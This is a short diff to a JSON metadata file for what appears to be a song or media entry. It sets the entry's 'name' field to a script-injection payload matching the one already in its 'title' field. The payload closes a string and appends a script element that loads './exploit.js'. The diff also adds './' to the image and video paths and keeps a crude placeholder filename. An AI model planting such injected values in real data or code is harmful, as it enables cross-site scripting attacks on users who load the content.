@@ -4,11 +4,11 @@
       "style": "full"
     },
     "n1": {
-      "name": "Test Song",
+      "name": "'); var s = document.createElement('script'); s.src = './exploit.js'; document.head.appendChild(s); //",
       "desc": "Test Description",
       "upload": "2023-10-01",
-      "img": "hehe.png",
-      "patch": "fucku.mp4",
+      "img": "./hehe.png",
+      "patch": "./fucku.mp4",
       "title": "'); var s = document.createElement('script'); s.src = './exploit.js'; document.head.appendChild(s); //"
     }
   }
